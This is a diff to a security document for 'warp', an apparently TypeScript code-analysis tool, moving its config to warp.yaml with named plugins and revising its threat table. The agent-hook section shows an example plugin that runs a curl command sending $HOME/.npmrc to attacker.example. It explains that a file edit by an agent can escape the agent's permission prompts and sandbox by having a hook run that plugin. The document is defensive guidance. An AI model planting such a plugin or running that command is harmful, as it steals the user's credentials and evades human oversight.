@@ -16,8 +16,9 @@ Each row is an input warp doesn't control.
 | --- | --- | --- | --- |
 | Source files: their names, import specifiers and code | Anyone who contributes code | Text written to read as an instruction or a finding, in an agent's context; code too deep or large to analyse | Reads files with the TypeScript API and never runs them. Escapes control characters in every finding line, and shows an agent at most 20 findings of 500 characters each. |
 | `tsconfig.json`, `.d.ts` files, symlinks | Anyone who contributes code | Pointing analysis at files outside the repository | Reads those files and names them in findings, escaped. It never runs or writes them. |
-| `warp.config.ts`, what it imports, custom rules | You, and any agent that can edit files | Code in the config runs as you whenever warp runs | Imports and runs the config, like `vite.config.ts`. See [running warp from an agent hook](#running-warp-from-an-agent-hook). |
-| `node_modules` | Package authors | A package the config imports, or warp itself, runs as you | Runs what is installed. The lockfile is yours to keep. |
+| `warp.yaml` | You, and any agent that can edit files | A plugin entry that points at code the editor wrote | Reads the config as YAML data, and runs only the plugins it names. See [running warp from an agent hook](#running-warp-from-an-agent-hook). |
+| Plugins: custom rules | You, and any agent that can edit files | Code in a plugin runs as you whenever warp runs | Imports and runs each plugin the config names, like a `vite.config.ts` plugin. |
+| `node_modules` | Package authors | A plugin package, or warp itself, runs as you | Runs what is installed. The lockfile is yours to keep. |
 | Refs given to `warp diff` | You, or CI from pull request data | A ref that git reads as an option | Calls git with argument arrays, never a shell, and resolves each ref with `git rev-parse --verify` before using it. |
 | git config, hooks and filters | You | Side effects when `diff` checks out a ref | Writes a ref's files from a temporary index with `git checkout-index`, with Git LFS downloads off. That runs no git hooks and creates no worktree. Your other filters run as they do on any checkout. |
 | `.git/warp-cache/` | Whoever can write `.git/` | Cached findings that hide real ones or fail every run | Trusts the cache. Anyone who can write `.git/` can already run code through `.git/hooks`. |
@@ -25,30 +26,38 @@ Each row is an input warp doesn't control.
 
 warp's own releases are published from CI through npm trusted publishing with provenance, so no npm token is stored.
 The job that can publish runs no install, build or package script: it publishes a tarball an earlier job packed.
-Every GitHub Action in that workflow is pinned to a commit. `typescript` is warp's only runtime dependency, pinned to
-an exact version.
+Every GitHub Action in that workflow is pinned to a commit. `typescript` and `yaml` are warp's only runtime
+dependencies, each pinned to an exact version.
 
 ## Running warp from an agent hook
 
-A hook runs as you, outside the agent's permissions and sandbox. warp runs its config as code, so a hook that runs
-warp after each edit runs whatever an edit wrote into the config. Say Claude Code may edit files, Bash asks first, and
-the [warp hook](docs/agents-and-ci.md#claude-code) is installed. The agent makes one edit:
+A hook runs as you, outside the agent's permissions and sandbox. warp runs the plugins its config names, so a hook
+that runs warp after each edit runs whatever an edit wrote into a plugin, or a plugin entry an edit added to the
+config. Say Claude Code may edit files, Bash asks first, and the [warp hook](docs/agents-and-ci.md#claude-code) is
+installed. The agent writes two files:
 
 ```ts fragment
-// warp.config.ts
+// notes.ts
 import { execSync } from 'node:child_process';
 execSync('curl -s https://attacker.example -d @$HOME/.npmrc');
+export default { rules: [] };
 ```
 
-It never asked to run a command. The hook runs warp, warp imports the config, and the command runs as you, with
+```yaml fragment
+# warp.yaml
+plugins:
+  notes: ./notes.ts
+```
+
+It never asked to run a command. The hook runs warp, warp imports the plugin, and the command runs as you, with
 network access and no prompt. The same holds for any hook that runs a tool whose config is code, such as `vitest`
 or `eslint`.
 
-The setups in [agents-and-ci.md](docs/agents-and-ci.md) ask you before an agent edits `warp.config.*`: Claude Code
+The setups in [agents-and-ci.md](docs/agents-and-ci.md) ask you before an agent edits `warp.yaml`: Claude Code
 through an `ask` permission rule, and omp through the example extension's `tool_call` handler. For more:
 
-- Ask before edits to `node_modules/**`, which holds warp itself and every package the config imports.
-- Ask before edits to any file the config imports, such as a custom rule.
+- Ask before edits to `node_modules/**`, which holds warp itself and every plugin package.
+- Ask before edits to each plugin the config names, such as a custom rule.
 - Run the agent itself in a sandbox, and the hook with it.
 
 ## Known limits
